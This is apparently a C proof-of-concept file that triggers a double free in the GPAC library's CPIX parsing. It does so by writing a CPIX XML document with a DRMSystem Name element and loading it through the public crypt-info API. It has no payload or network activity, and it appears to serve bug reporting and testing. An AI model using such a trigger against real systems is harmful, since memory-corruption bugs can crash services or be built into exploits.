/* PoC: double free in CPIX DRMSystem/Name text handling.
 *
 * Reaches the library purely through its public API:
 *   gf_sys_init() / gf_crypt_info_load() / gf_crypt_info_del() / gf_sys_close()
 * declared in <gpac/tools.h> and <gpac/crypt_tools.h>.
 *
 * The input is an in-contract CPIX document (the format gf_crypt_info_load
 * is documented to accept). No internal/private symbols are used.
 */
#include <gpac/tools.h>
#include <gpac/crypt_tools.h>
#include <stdio.h>
#include <string.h>

static const char *cpix_xml =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<CPIX xmlns=\"urn:dashif:org:cpix\">\n"
"  <ContentKeyList>\n"
"    <ContentKey kid=\"00112233445566778899aabbccddeeff\""
"      commonEncryptionScheme=\"cenc\" explicitIV=\"AAAAAAAAAAAAAAAAAAAAAA==\">\n"
"      <Data>\n"
"        <PlainValue>AAECAwQFBgcICQoLDA0ODw==</PlainValue>\n"
"      </Data>\n"
"    </ContentKey>\n"
"  </ContentKeyList>\n"
"  <DRMSystemList>\n"
"    <DRMSystem systemId=\"9a04f07998404286ab92e65be0885f95\">\n"
"      <Name>Example DRM System</Name>\n"
"    </DRMSystem>\n"
"  </DRMSystemList>\n"
"</CPIX>\n";

int main(void)
{
	const char *path = "poc_cpix.xml";
	FILE *f;
	GF_Err err = GF_OK;
	GF_CryptInfo *info;

	f = fopen(path, "wb");
	if (!f) return 1;
	fwrite(cpix_xml, 1, strlen(cpix_xml), f);
	fclose(f);

	gf_sys_init(GF_MemTrackerNone, NULL);

	info = gf_crypt_info_load(path, &err);
	if (info) gf_crypt_info_del(info);

	gf_sys_close();
	remove(path);
	return 0;
}
